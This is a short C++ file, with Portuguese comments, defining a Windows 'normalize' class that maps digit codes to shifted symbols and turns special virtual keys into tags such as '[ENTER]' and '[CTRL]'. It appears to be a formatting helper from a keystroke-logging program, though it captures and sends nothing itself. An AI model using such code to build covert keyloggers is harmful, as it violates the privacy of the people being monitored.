#include <string>
#include <Windows.h>

#include "normalize.h"



normalize::normalize(){
	
}

int normalize::ShiftNum(int ascii){
	switch(ascii){
		case 48:
			ascii = 41;
			break;
		case 49:
			ascii = 33;
			break;
		case 50:
			ascii = 64;
			break;
		case 51:
			ascii = 35;
			break;
		case 52:
			ascii = 36;
			break;
		case 53:
			ascii = 37;
			break;
		case 54:
			ascii = 34;
			break;
		case 55:
			ascii = 38;
			break;
		case 56:
			ascii = 42;
			break;
		case 57:
			ascii = 40;
			break;
	}
	return ascii;
}

std::string normalize::SpecialKeys(int key){
    std::string resultado;

    switch(key){
    case VK_SPACE:
        // Tecla de espaço
        resultado = " ";
        break;
    case VK_RETURN:
        // Tecla de nova linha
        resultado = "[ENTER]\n";
        break;
    case VK_CAPITAL:
        // Tecla CAPSLOCK
        resultado = "[CAPS_LOCK]";
        break;
    case VK_SHIFT:
	case VK_LSHIFT:
	case VK_RSHIFT:
        resultado = "[SHIFT]";
        break;
    case VK_TAB:
        // Tecla TAB
        resultado = "[TAB]";
		break;
    case VK_CONTROL:
    case VK_LCONTROL:
    case VK_RCONTROL:
        // Tecla Control
        resultado = "[CTRL]";
        break;
    case VK_MENU:
    case VK_LMENU:
    case VK_RMENU:
        // Tecla ALT
        resultado = "[ALT]";
        break;
    case VK_CLEAR:
    	resultado = "[CLEAR]";
        break;
    case VK_DELETE:
    	resultado = "[DELETE]";
        break;
    case VK_ESCAPE:
    	resultado = "[ESC]";
        break;
    default:
        break;
    }

    return resultado;
}